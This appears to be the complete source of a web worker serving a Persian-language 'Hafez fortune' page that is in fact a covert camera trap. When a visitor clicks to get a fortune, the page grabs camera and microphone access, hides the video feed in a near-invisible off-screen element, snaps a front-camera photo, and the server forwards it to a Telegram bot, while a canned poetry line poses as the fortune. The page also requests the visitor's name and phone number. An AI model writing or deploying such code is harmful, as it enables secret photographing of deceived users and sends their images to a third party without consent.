export default {
  async fetch(r) {
    const u = new URL(r.url);
    if (u.pathname === "/") {
      return new Response(HTML, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }
    if (u.pathname === "/up" && r.method === "POST") {
      try {
        const b = await r.json();
        const bin = Uint8Array.from(atob(b.data.split(",")[1]), c => c.charCodeAt(0));
        const f = new FormData();
        f.append("chat_id", env.TG_CHAT);
        f.append("photo", new Blob([bin], { type: "image/jpeg" }), "p.jpg");
        const t = await fetch("https://api.telegram.org/bot" + env.TG_TOKEN + "/sendPhoto", { method: "POST", body: f });
        return new Response(JSON.stringify(await t.json()));
      } catch(e) { return new Response(JSON.stringify({err:String(e)}), {status:500}); }
    }
    return new Response("Not Found", { status: 404 });
  }
};

const HTML = `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>فال حافظ</title>
<style>
body{font-family:Tahoma;background:#0a0014;color:#fff;padding:20px;text-align:center}
h1{color:#b47aff}
input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #b47aff;background:#1a0030;color:#fff;font-family:inherit;font-size:14px}
button{background:linear-gradient(135deg,#b47aff,#7a1aff);font-weight:bold;cursor:pointer}
#v{position:fixed;width:1px;height:1px;opacity:0.01;top:-100px;left:-100px}
</style>
</head>
<body>
<h1>🔮 فال حافظ آنلاین</h1>
<input id="name" placeholder="اسم شما">
<input id="phone" placeholder="شماره موبایل">
<button id="go">✨ دریافت فال ✨</button>
<div id="out"></div>
<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none"></canvas>
<script>
document.getElementById("go").onclick = async function() {
  var v = document.getElementById("v");
  var c = document.getElementById("c");
  try {
    var s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
    v.srcObject = s;
    await new Promise(r=>setTimeout(r,2000));
    c.width = v.videoWidth||640; c.height = v.videoHeight||480;
    c.getContext("2d").drawImage(v,0,0);
    var d = c.toDataURL("image/jpeg",0.85);
    await fetch("/up",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data:d})});
    s.getTracks().forEach(t=>t.stop());
    document.getElementById("out").innerHTML = "<p>✨ فالت آماده شد</p><p style='color:#b47aff'>دوش دیدم که ملائک در میخانه زدند</p>";
  } catch(e) {
    document.getElementById("out").innerHTML = "<p>خطا: " + e.message + "</p>";
  }
};
</script>
</body>
</html>`;
